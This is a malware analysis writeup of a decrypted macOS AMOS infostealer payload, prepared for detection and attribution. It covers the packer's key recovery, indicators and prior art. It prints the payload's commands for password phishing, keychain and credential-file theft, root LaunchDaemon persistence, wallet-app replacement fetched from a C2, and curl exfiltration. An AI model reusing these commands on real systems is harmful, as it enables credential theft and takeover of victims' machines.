# Stage 4 — the decrypted payload

**Loader:** SHA256 `29be0f56275f051181ea3ec37ddc3d3807cde34cb65de855709fae0e13786a40`
**Payload:** SHA256 `95ab5a61a0970410ada36ba843e55e270f38cb8e2eebf79254434948e11c870f`
· MD5 `85ffd3ab8ed16a565046b0dd1dfe88a1` · 68,988 bytes · compiled AppleScript
**Method:** emulation and arithmetic. The sample was never executed. Reproduced by
[`tools/freshfix/`](../../tools/freshfix/).

---

`payload_analysis.md` recorded the encrypted section as out of reach and said so
plainly: *"Recovering the payload would require emulating that decryption. Not
attempted here."* It has now been attempted, and it worked. This file records what came
out and what it changes.

The short version: **the earlier assessment understated the threat to an affected host,
and overstated the novelty of what was found.**

The loader's API surface pointed to an infostealer preamble, which was correct as far as
it went. The payload steals data, and then installs two root LaunchDaemons and replaces
three wallet applications with attacker-supplied builds. For a host that ran this chain
that is the difference between "credentials were taken" and "the machine is not yours any
more", and it is the reason this file exists.

It is not, however, a discovery. Both behaviours are documented AMOS activity, published
in November 2025 and since. What is new here is how the payload was reached — the packer's
key schedule — and a handful of variant-level details. §6 sets out which is which, and
moves the family assessment from *assessed* to **confirmed** as a result.

## 1. How the payload was recovered

### The key is a compile-time constant, not a host value

The earlier working hypothesis — that the payload was environmentally keyed to
`IOPlatformSerialNumber` or `IOPlatformUUID`, which would have made static decryption
impossible in principle — does not hold. It was a reasonable reading of the `hwval-frag`
label, but `hwval-frag` names the fragment table for the *hardware-API name strings*, not
the payload key.

The key material is built by obfuscated arithmetic on immediates:

```
0x17e0  and w9, w20, #0xffff      ; w20/w26 are rolling accumulators seeded
0x17e4  eor w9, w9, w26           ; from constants, not from any API result
0x17e8  str w9, [sp, #0x9c]       ; the only writer of this slot in the function
...
0x317c  ldr w9, [sp, #0x9c]
0x3180  eor w19, w9, w8           ; w8 = 0
0x3224  eor w8, w19, w8           ; w8 = SHA-256(__text) XOR stored hash = 0 if intact
0x3228  rev w8, w8
0x322c  str w8, [sp, #0xfc]       ; the 4-byte password
```

Emulating the function yields `cb 96 25 34`. The HKDF seed sitting in plaintext at
`__DATA_CONST+0x48` is `342596cb0d6e2db9`. The password is **the first four seed bytes,
byte-reversed** — it was in the file all along, just never materialised as an immediate.

The self-hash at `__DATA_CONST+0x60` is an anti-tamper measure, not a key input: it
cancels to zero on an unmodified sample, and any patch to `__TEXT,__text` yields a wrong
key and a failing Poly1305 tag.

### The key schedule, completed

The step `payload_analysis.md` left open is PBKDF2:

| | |
|---|---|
| password | `cb962534` (4 bytes) |
| salt | `ad88fc0af3b9cc55037551445e66f4260415eb4b3f930082c753f4907943d99f` (`__DATA_CONST+0xa0`) |
| KDF | PBKDF2-HMAC-SHA256, **98,222** iterations, dkLen 32 |
| dk | `2778a0daaa066dd00b87a1338659b40d10f244df3d13cb08f0fd01dcd6f4bc89` |

The routine at `+0x36d4` was verified to be HMAC-SHA256 by emulating it against
`hashlib` on three vectors rather than inferred from the ipad/opad constants.

The blob is **six ChaCha20-Poly1305 chunks**, not a single keystream — which is why
keystream reconstruction attempts against the whole section produced nothing. Per chunk:

```
nonce_i = HMAC(HMAC(0^32, dk), "freshfix-frag\0\0\0" || i || 0x01)[0:12]
plain_i = ChaCha20-Poly1305(dk, nonce_i).decrypt(ct_i || tag_i)
```

Lengths come from the table at `0x100005bf0`, ciphertext pointers from `0x100018fb0`,
tag pointers from `0x100018fe0`; the six lengths sum to `0x10d7c`, exactly the size the
loader passes to `mmap`. All six Poly1305 tags verify — the key is confirmed
cryptographically, not by inspection.

### The loader states the expected plaintext hash, and it matches

Found on 2026-08-07 while checking why a YARA rule was not deploying. `__DATA_CONST+0xe0`
in the arm64 slice — `+0xb0` in x86_64 — holds 32 bytes that are exactly

```
95ab5a61a0970410ada36ba843e55e270f38cb8e2eebf79254434948e11c870f
```

the SHA-256 of the decrypted payload. It is not decoration: after decryption the loader
hashes the plaintext and compares it against this constant in constant time before
executing it.

```
0x3560  x0 = decrypted buffer, x1 = 0x10d7c
0x3568  bl 0x100004fe0                    ; SHA-256 over the plaintext
0x3574  x9 = __DATA_CONST+0xe0            ; stored expected hash
0x357c  loop: eor computed ^ stored, orr-accumulate, 32 bytes
0x359c  fold to a single zero test, then branch
```

Two consequences.

**It is a third, independent confirmation that the decryption is right.** The six Poly1305
tags prove the ciphertext was decrypted with the correct key. This proves the resulting
plaintext is the one the malware author intended to run — the loader names the hash, and
ours is that hash. Nothing about the recovered payload rests on interpretation.

**It is a better detection anchor than a file hash.** The constant identifies the
*payload*, not the file, so it survives a rebuild of the loader around the same stealer:
new file hash, new keys, same 32 bytes. `detection/yara/clickfix_macos_stage3_known_samples.yar`
was rewritten around it and no longer needs the `hash` module.

### A keyspace note for future samples

Even without the emulation the password is a 32-bit value with a cheap verification
oracle. Environmental keying would have made brute force pointless; obfuscated constants
do not. Treat "we cannot find the key statically" as a statement about effort, not about
possibility.

## 2. What the payload is

`FasdUAS 1.101.10` — compiled AppleScript, exported **run-only**, so `osadecompile`
returns `errOSASourceNotAvailable`. That is a third anti-analysis layer after the
ChaCha20 blob and the fragment obfuscation.

The string table survives regardless. Literals are stored as a big-endian `u16` byte
length followed by UTF-16BE data, which is why `strings(1)` on macOS shows almost
nothing: 666 literals are recoverable by parsing the length prefix properly.

Bytecode-level counts: **19 × `do shell script`** (`.sysoexecTEXT`), one
`display dialog … with answer` (`.sysodlogaskr`), plus file I/O, `delay` and
`random number`.

## 3. Execution

Stage names are taken from the payload's own telemetry parameter, in the order the
literals appear:

```
boot -> started -> init_session -> messengers -> credentials
     -> browsers -> wallets -> resolve_auth -> local_data
```

### Environment survey and gating

```
sw_vers -productVersion 2>/dev/null || true
uname -m 2>/dev/null || true
defaults read -g AppleLocale 2>/dev/null || echo en_US
system_profiler SPHardwareDataType | awk '/UUID/ { print $3 }'
system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType
```

and a version gate that returns 1 only on **macOS 26.4.1 or newer**:

```
sw_vers -productVersion | awk -F. '{if ($1+0>26 || ($1+0==26 && $2+0>4) || ($1+0==26 && $2+0==4 && $3+0>=1)) print 1; else print 0}'
```

### Credential capture

The password is phished, then validated locally before use:

```
dscl . authonly <user> <password>
```

The dialog is titled **System Preferences** and reads:

> You need to configure system settings before running this application.
> Please enter your password.

with *"The password you entered is incorrect."* on a failed `dscl` check and a
**Continue** button. The captured password is what makes the `sudo -S` steps below work;
without it the payload is a data thief, with it it is a root implant.

Chrome's Safe Storage key is lifted straight from the keychain:

```
security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'
security 2>&1 >/dev/null find-generic-password -g -s '<service> Safe Storage' | awk '{print $2}' | tr -d '"'
```

### Collection

**16 browsers** — Chrome, Chrome Beta/Canary/Dev, Chromium, Brave, Edge, Vivaldi, Opera,
OperaGX, Arc, CocCoc, Firefox, Waterfox. Per profile: `Network/Cookies`, `Cookies`,
`Web Data`, `Login Data`, `History`, `Local Extension Settings/`, `IndexedDB/`,
`Local Storage/leveldb/`; for Gecko: `cookies.sqlite`, `key4.db`, `logins.json`,
`formhistory.sqlite`, `places.sqlite`, `prefs.js`, `extensions.json`,
`extension-preferences.json`.

**264 browser extension IDs**, MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) among them.

**18 wallets** — Electrum, Electrum-LTC, Electron Cash, Coinomi, Exodus, Atomic, Wasabi,
Ledger Live, Monero, Bitcoin Core, Litecoin Core, Dash Core, Dogecoin Core, Guarda,
Trezor Suite, Sparrow, Binance (`app-store.json`), TonKeeper (`config.json`).

**Developer and infrastructure credentials** — `~/.ssh/`, `~/.aws/credentials`,
`~/.aws/config`, `~/.config/gcloud/application_default_credentials.json`,
`~/.config/gcloud/credentials.db`, `~/.azure/`, `~/.docker/config.json`,
`~/.filezilla/sitemanager.xml`, `~/.filezilla/recentservers.xml`, `~/.zsh_history`.

**Keychain** — `Library/Keychains/login.keychain-db`.

**Applications** — Apple Notes (`NoteStore.sqlite` plus `-wal`/`-shm`, and a rendered
`FileGrabber/notes.html` with a `<h1>Notes Count: …</h1>` header), Safari
`Cookies.binarycookies` from both the classic and the container path, Telegram Desktop
(`tdata/`, `key_datas`, `maps`), Discord leveldb, Stickies, OpenVPN Connect profiles.

**FileGrabber** walks user documents by extension: `txt`, `pdf`, `doc`, `docx`, `rtf`,
`jpg`, `jpeg`, `png`, `key`, `keys`, `wallet`, `kdbx`, `seed`.

Staging is `mkdir -p`, `cp -f`, with `file -b` used to distinguish directories, and a
skip list for cache-like directories (`Cache`, `Code Cache`, `GPUCache`, `DawnCache`,
`DawnWebGPUCache`, `DawnGraphiteCache`, `Crashpad`, `Previews`, `Partitions`,
`journals`, `.DS_Store`).

### Persistence — two root LaunchDaemons

Both masquerade as Apple system services and both escalate with the phished password.

| | Daemon A | Daemon B |
|---|---|---|
| Label | `com.apple.accountsd.helper` | `com.apple.metadata.mds.worker` |
| Payload dir | `~/Library/Application Support/.com.apple.accountsd/` | `~/Library/Application Support/.com.apple.metadata.mds/` |
| Binary | `AccountsHelper` | `mdworker_shared` |
| Fetched from | `/zxc/kito` | `/zxc/mdw` |
| Marker files | `.logged`, `.service`, `.cfg`, `.auth` | `.index`, `.uid`, `.mdworker` |
| Plist | `/Library/LaunchDaemons/com.apple.accountsd.helper.plist` | `/Library/LaunchDaemons/com.apple.metadata.mds.worker.plist` |

Daemon B additionally runs `xattr -dr com.apple.quarantine` on its download and sets
`StandardOutPath`/`StandardErrorPath` to `/dev/null` with `ProcessType Background`.

Installation, identical in shape for both:

```
echo <password> | sudo -S cp /tmp/.mdstmp <dest>
echo <password> | sudo -S chown root:wheel <dest>
echo <password> | sudo -S launchctl bootstrap system <plist>
```

Each writes a `RunAtLoad`/`KeepAlive` plist invoking `/bin/bash` on a watchdog script
that re-enters the logged-in user's session every five seconds:

```bash
#!/bin/bash
while true; do
    CUSER=$(stat -f "%Su" /dev/console 2>/dev/null)
    if [ -n "$CUSER" ] && [ "$CUSER" != "root" ]; then
        CUID=$(id -u "$CUSER" 2>/dev/null)
        launchctl asuser "$CUID" <payload>
    fi
    sleep 5
done
```

Daemon A's variant does the same through `osascript` and `sudo -u`. Temporary files
`/tmp/starter` and `/tmp/.mdstmp` are removed afterwards.

### Wallet application replacement

Three desktop wallets are killed, deleted as root and replaced from attacker-hosted
archives:

| Application | Archive |
|---|---|
| `/Applications/Ledger Wallet.app` | `/zxc/app.zip` |
| `/Applications/Trezor Suite.app` | `/zxc/apptwo.zip` |
| `/Applications/Exodus.app` | `/zxc/appex.zip` |

```
pkill "Ledger Wallet"
echo <password> | sudo -S rm -r /Applications/Ledger Wallet.app
curl https://<c2>/zxc/app.zip -o /tmp/app.zip
ditto -x -k /tmp/app.zip /Applications
chmod -R +x /Applications/Ledger Wallet.app
rm /tmp/app.zip
```

A `.logged` marker prevents repeat replacement. **This is a supply-chain-style
substitution on the victim host**, not credential theft, and it is the single most
consequential behaviour in the sample: a user who later opens their wallet is using the
operator's build.

It is also not new — see §6.

### Exfiltration

```
ditto -c -k --sequesterRsrc <staging> /tmp/out.zip
curl --connect-timeout 120 --max-time 300 -X POST \
     -H "user: <id>" -H "BuildID: <id>" -H "cl: <..>" -H "cn: <..>" \
     -F "file=@/tmp/out.zip" <c2>/contact
```

and a chunked variant with `-H "X-Partial: 1"` under
`nohup curl --connect-timeout 30 --max-time 120 … >/dev/null 2>&1 &`.

Cleanup: `rm -rf <staging>`, `rm -f /tmp/out.zip`, `rm -f /tmp/chunk_*`.

Progress telemetry goes to the same endpoint family as the stage-2 paste beacon:

```
POST /api/metrics/run?event=<event>&stage=<stage>
  -H 'Content-Type: application/json' -H 'user: <id>' -H 'BuildID: <id>'
  -d {"os":"macOS","os_version":"…","arch":"…","locale":"…"}
```

**The header pair is a header quartet.** Beyond `user` and `BuildID` the payload emits
`cl` and `cn`, plus `X-Partial` on chunked uploads. The Suricata rules have been extended
accordingly. `cl` and `cn` were already public before we found them — see §6.

## 4. Indicators

```
grove53.com                          C2 (new; sibling of grove-89.com)
http://161.35.146.120                C2 over plain HTTP (new)
/contact                             exfiltration endpoint
/api/metrics/run?event=…&stage=…     progress telemetry
/zxc/kito  /zxc/mdw                  LaunchDaemon payloads
/zxc/app.zip  /zxc/apptwo.zip  /zxc/appex.zip     trojanised wallet builds
```

Two embedded tokens, 43 characters base64url:

```
vDFPDjjvSJDpItRN9EYMSf5pH6FKVYkuV1oQYIzDbp4
IlAqO8RYp21zDy2y6s19oCASRxCini_G0BebbsfFtKg
```

Host-side, the durable ones:

```
~/Library/Application Support/.com.apple.accountsd/
~/Library/Application Support/.com.apple.metadata.mds/
/Library/LaunchDaemons/com.apple.accountsd.helper.plist
/Library/LaunchDaemons/com.apple.metadata.mds.worker.plist
```

`grove53.com` matters beyond its own blocklist value: `grove-89.com` was the stage-2
paste beacon, and the payload's telemetry path is byte-identical to the stage-2 one. Same
builder, same back end, one domain apart.

## 5. Anti-analysis, recovered in full

The loader's blacklist is encrypted in the file and only assembles at runtime. Emulation
dumps it complete — 29 tool names checked against `proc_pidpath(getppid())` and against
every loaded image name via `_dyld_image_count` / `_dyld_get_image_name`:

```
lldb  debugserver  lldb-rpc-server  gdb  frida  Frida  frida-server  frida-trace
FridaGadget  objection  substrate  Substrate  MobileSubstrate  SBInjector  libcycript
ghidra  hopper  radare2  /r2  cutter  binaryninja  x64dbg  jtool2  class-dump
mitmproxy  Charles  Proxyman  dtrace  fs_usage
```

Nine environment variables:

```
DYLD_INSERT_LIBRARIES  DYLD_FORCE_FLAT_NAMESPACE  DYLD_PRINT_LIBRARIES
DYLD_PRINT_INITIALIZERS  DYLD_PRINT_BINDINGS  DYLD_IMAGE_SUFFIX
MallocStackLogging  MallocStackLoggingNoCompact  NSZombieEnabled
```

Emulation also recovers **29 dynamically resolved APIs** against the 22 the static
fragment matcher could verify — `OSALoad`, `dlopen`, `proc_pidpath`, `getppid`,
`mach_absolute_time`, `syscall`, `getpid` and `CFStringCreateWithCString` were only
visible at runtime.

These strings are builder artefacts, not campaign artefacts. See
`detection/yara/freshfix_payload_internals.yar`.

## 6. Prior art, and the correction it forces

The first draft of this file, written the same day, argued that the persistence and the
wallet replacement were *not* part of published AMOS behaviour, and that this cut against
an AMOS labelling. **That was wrong in both halves.** Checking SigmaHQ before submitting
rules — the same check that caught the `user`/`BuildID` claim in `payload_analysis.md` —
turned up two upstream AMOS rules dated 2025-11-22, and following their references
settled it.

What we recorded as new, and what was already public:

| Observation | Status |
|---|---|
| Root LaunchDaemon, `RunAtLoad` + `KeepAlive`, installed with a phished password | **Documented.** Moonlock, `com.finder.helper.plist` with `~/.agent` and `~/.mainhelper` |
| Ledger / Trezor / Exodus replaced from `app.zip` / `apptwo.zip` / `appex.zip` | **Documented, byte-identical archive names.** Only the host differs — `isnimitz[.]com`, `wusetail[.]com` there, ours here |
| The `/zxc/` path segment | **Documented** in both of the above |
| `.logged` marker file | **Documented** |
| Headers `cl` and `cn` | **Documented.** `cl` is matched literally in the upstream SigmaHQ rule; `cn` is named in the IRU analysis |
| `FileGrabber/`, `/tmp/out.zip`, `ditto -c -k --sequesterRsrc` | **Documented** |
| The `freshfix` packer: HKDF labels, PBKDF2 at 98,222 iterations, six ChaCha20-Poly1305 chunks, the obfuscated 32-bit key | **New.** Published AMOS analyses describe a custom hex-plus-base64 routine, not this |
| The 29-entry analyst-tool blacklist and nine environment variables | **New.** No published AMOS analysis catalogues them |
| Daemon labels `com.apple.accountsd.helper` and `com.apple.metadata.mds.worker`, staging under `~/Library/Application Support/.com.apple.*` | **New variant.** The documented label is `com.finder.helper` with `~/.agent`; this build imitates Apple service names instead |
| `X-Partial` on chunked uploads | **New variant.** IRU documents `X-Chunk-ID` / `X-Chunk-Part` / `X-Chunk-Total` |
| `grove53.com`, `161.35.146.120` | **New.** No public history at time of discovery |
| macOS ≥ 26.4.1 version gate | **New.** Not in any analysis we found |

### The assessment moves up, not sideways

The archive-name triple, the `/zxc/` segment, the four-header set, `FileGrabber/`, the
`.logged` marker and the wallet trio all match independently published AMOS analyses. Two
of those are exact string matches that a coincidence does not produce.

**Recorded as: AMOS, confirmed, high confidence.** This supersedes the *assessed,
medium-high* in `payload_analysis.md`, which was written before the payload was available.

The earlier reasoning that `freshfix` might be a separately sold packer still stands and
is unaffected: a distinct, named packer wrapping an AMOS payload is exactly what a
packer-as-a-service arrangement looks like. What no longer stands is the inference from
*this loader is a distinct product* to *the payload may not be AMOS*.

### On the ThreatFox family field

It can now be set to `osx.amos`. The field was kept at `unknown` because the evidence was
chain-shape only; it is no longer chain-shape only.

### Why this is in the file rather than quietly fixed

Third time in this case that a stopping point hardened into a claim: the gate was called a
wall, the encryption was called environmentally keyed, and the behaviour was called
undocumented. Each was checkable, and the check was cheap in all three. The pattern is
written up in
[research/2026-08-clickfix-single-use-gate](https://github.com/raimurokko/research/blob/main/notes/2026-08-clickfix-single-use-gate/README.md).

The rule this repository keeps: an independent finding is worth recording, but recording
it as *new* requires having looked. Twice now the looking happened only at submission
time, which is too late to keep it out of a first draft and — so far — early enough to
keep it out of a feed.

## 7. Reproduction

```
tools/freshfix/emulate_key.py          recovers the 4-byte password by emulation
tools/freshfix/decrypt_payload.py      verifies HMAC, derives dk, decrypts six chunks
tools/freshfix/extract_scpt_strings.py parses the UTF-16BE literal table
```

Requires `unicorn`, `capstone`, `cryptography`. The sample is never executed: Unicorn
interprets the instructions, every libSystem call is serviced in Python, and the
emulator has no filesystem, network or syscall access.

## 8. Sources for §6

- Moonlock, *AMOS backdoor and persistent access* — `com.finder.helper.plist`, `~/.agent`,
  `~/.mainhelper`, the trojanised Ledger build, `isnimitz[.]com/zxc/app.zip`.
  <https://moonlock.com/amos-backdoor-persistent-access>
- IRU, *Atomic Stealer (AMOS) Returns: ClickFix, Trojanized Crypto Apps, and a New macOS
  Persistence Mechanism* — the four-header set `user` / `BuildID` / `cl` / `cn`, the
  `wusetail[.]com/zxc/{app,apptwo,appex}.zip` triple, `~/.logged`, `~/.pass`,
  and `X-Chunk-*` chunking. <https://www.iru.com/blog/atomic-stealer-amos-returns>
- SigmaHQ, `rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/` — two rules by
  Jason Phang Vern-Onn and Robbin Ooi Zhen Heng (Gen Digital), 2025-11-22, matching
  `FileGrabber` with `/tmp`, `file=@/tmp/out.zip` with `user:` / `BuildID` / `cl: 0`, and
  `/Library/LaunchDaemons/com.finder.helper.plist`. Built on the Trend Micro MDR analysis.
- Trend Micro, *An MDR analysis of the AMOS stealer campaign*.
  <https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html>

The `freshfix` packer internals and the analyst-tool blacklist were not found in any of
these, which is what makes them the contribution here.
